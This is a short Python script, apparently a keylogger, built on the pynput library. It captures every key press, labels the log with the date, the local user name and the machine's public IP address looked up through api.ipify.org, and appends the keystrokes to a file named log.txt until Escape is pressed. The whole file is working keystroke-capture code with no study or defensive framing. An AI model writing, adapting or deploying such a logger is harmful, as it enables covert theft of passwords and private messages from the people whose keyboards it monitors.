import os
import requests
import socket
import time
from pynput.keyboard import Key, Listener


class KeyLogVar:
    counter = 0
    key_logs = []


date_time = time.ctime(time.time())
user = os.path.expanduser('~').split(socket.gethostname())
pubIP = requests.get('https://api.ipify.org').text

Log_Title = f'Date/Time: {date_time} User: {user} PublicIP#: {pubIP} '
KeyLogVar.key_logs.append(Log_Title)


def key_input(key):
    key_substitution = ['Key.enter', '(ENTER)', 'Key.backspace', '(BACKSPACE)', 'Key.space', ' ',
                        'Key.alt_l', '(ALT)', 'Key.tab', '(TAB)', 'Key.delete', '(DEL)', 'Key.ctrl_l', '(CTRL)',
                        'Key.left', '(LEFT ARROW)', 'Key.right', '(RIGHT ARROW)', 'Key.shift', '(SHIFT)', 'Key.up',
                        '(UP ARROW)', 'Key.down', '(DOWN ARROW)']
    key = str(key).replace("'", "")
    if key in key_substitution:
        KeyLogVar.key_logs.append(key_substitution[key_substitution.index(key) + 1])
    else:
        KeyLogVar.key_logs.append(key)
    file_wr(KeyLogVar.key_logs)
    KeyLogVar.key_logs = []


def file_wr(key_logs):
    with open("log.txt", "a") as f:
        k = str(key_logs)
        f.write(k)


def key_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=key_input, on_release=key_release) as listener:
    listener.join()
